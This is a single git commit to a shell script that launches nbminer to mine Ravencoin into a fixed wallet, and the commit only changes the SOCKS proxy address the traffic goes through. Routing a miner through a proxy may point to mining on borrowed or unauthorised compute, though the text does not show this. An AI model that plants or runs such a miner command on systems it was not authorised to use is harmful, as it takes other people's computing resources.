506e719e9c774dc11c431fd98d233b2036f47894
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-14 15:36:55 +0200

    Update RVNMwSocks4.sh

--- RVNMwSocks4.sh
+++ RVNMwSocks4.sh
@@ -1,1 +1,1 @@
-./nbminer -a kawpow -o stratum+ssl://stratum.ravenminer.com:13838 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.NB -log --proxy 172.104.13.173:9999
+./nbminer -a kawpow -o stratum+ssl://stratum.ravenminer.com:13838 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.NB -log --proxy 96.126.108.228:9999
